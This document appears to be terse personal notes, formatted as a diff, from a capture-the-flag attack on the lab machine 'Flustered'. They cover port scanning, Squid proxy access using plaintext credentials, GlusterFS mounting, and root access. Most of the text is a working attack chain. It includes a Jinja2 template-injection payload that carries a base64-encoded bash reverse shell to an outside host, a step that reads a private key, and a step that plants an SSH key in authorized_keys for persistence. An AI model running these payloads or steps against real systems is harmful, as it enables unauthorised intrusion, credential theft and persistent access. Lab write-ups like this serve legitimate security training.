@@ -1,0 +1,120 @@
+Flustered   10.10.11.131
+
+[+]Enumeration
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 93:31:fc:38:ff:2f:a7:fd:89:a3:48:bf:ed:6b:97:cb (RSA)
+|   256 e5:f8:27:4c:38:40:59:e0:56:e7:39:98:6b:86:d7:3a (ECDSA)
+|_  256 62:6d:ab:81:fc:d2:f7:a1:c1:9d:39:cc:f2:7a:a1:6a (ED25519)
+80/tcp    open  http        nginx 1.14.2
+|_http-title: steampunk-era.htb - Coming Soon
+|_http-server-header: nginx/1.14.2
+111/tcp   open  rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
+3128/tcp  open  http-proxy  Squid http proxy 4.6
+|_http-title: ERROR: The requested URL could not be retrieved
+|_http-server-header: squid/4.6
+49152/tcp open  ssl/unknown
+| ssl-cert: Subject: commonName=flustered.htb
+| Not valid before: 2021-11-25T15:27:31
+|_Not valid after:  2089-12-13T15:27:31
+|_ssl-date: TLS randomness does not represent time
+49153/tcp open  rpcbind
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+[+]udpScan
+
+111/udp open  rpcbind
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
+
+
+[+]subdomain
+flustered.htb
+
+curl view-source:http://flustered.htb/
+<title>steampunk-era.htb - Coming Soon</title>
+
+
+[+]P 3128
+Squid is a caching and forwarding HTTP web proxy. 
+
+Enumeration
+Web Proxy
+You can try to set this discovered service as proxy in your browser. However, if it's configured with HTTP authentication you will be prompted for usernames and password.
+
+
+❯ curl -v  --proxy http://10.10.11.131:3128 http://10.10.11.131
+< HTTP/1.1 407 Proxy Authentication Required
+< Server: squid/4.6
+< Mime-Version: 1.0
+
+
+[+]P 49152  GluterFS
+
+GlusterFS is a distributed, arbitrarily scalable file system that aggregates storage components from several servers into one, uniform file system.
+Enumeration
+To interact with this filesystem you need to install the GlusterFS client (sudo apt-get install glusterfs-cli).
+
+❯ sudo gluster --remote-host=10.10.11.131 volume list
+vol1
+vol2
+
+❯ sudo mount -t glusterfs 10.10.11.131:/vol1 /mnt/
+❯ sudo mount -t glusterfs 10.10.11.131:/vol2 /mnt/
+
+curl --proxy http://lance.friedman:'o>WJ5-jD<5^m3'@10.10.11.131:3128
+http://10.10.11.131/
+
+curl --proxy http://lance.friedman:'o>WJ5-jD<5^m3'@10.10.11.131:3128
+http://127.0.0.1/app/app.py
+
+[+]SSTI
+
+curl -H "Content-Type: application/json" -d '{"siteurl":"{{7*7}}"}' flustered.htb
+<title>49 - Coming Soon</title>
+
+[+]SSTI to RCE
+❯ curl -H "Content-Type: application/json" -d '{"siteurl":"{% for x in().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__[\"__import__\"](\"os\").system(\"echo L2Jpbi9iYXNoIC1jICdiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNDIvNDQ0NCAwPiYxJwo=|base64 -d|bash\")}}{%endif%}{% endfor %}"}' http://flustered.htb
+
+[+]Intrusion
+www-data@flustered:~/html/app$ hostname -I
+10.10.11.131
+
+[+]Privilage Escalation
+www-data@flustered:/home$ ls
+jennifer
+
+[+]linpeash.sh
+
++ Possible private SSH keys were found! > /etc/ssl/glusterfs.key
++ https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation
+runc was found in /usr/bin/runc, you may be able to escalate privileges with it
++ -rwxr-sr-x 1 root crontab 43K Oct 11  2019 /usr/bin/crontab
+
+[+]cat /etc/ssl/glusterfs.key
++ id_rsa
+
+mount -t glusterfs 10.10.11.131:/vol1 /mnt
+
+:/mnt/.ssh# echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> authorized_keys 
+
+sh -i ~/keys/ed25519_gen jennifer@10.10.11.131
+jennifer@flustered:~$ cat user.txt
+ssh -i ~/keys/ed25519_gen jennifer@10.10.11.131 -L 10000:172.17.0.2:10000
+-L 10000:172.17.0.2:10000
+
+root@flustered:~# cat root.txt
+
+
+
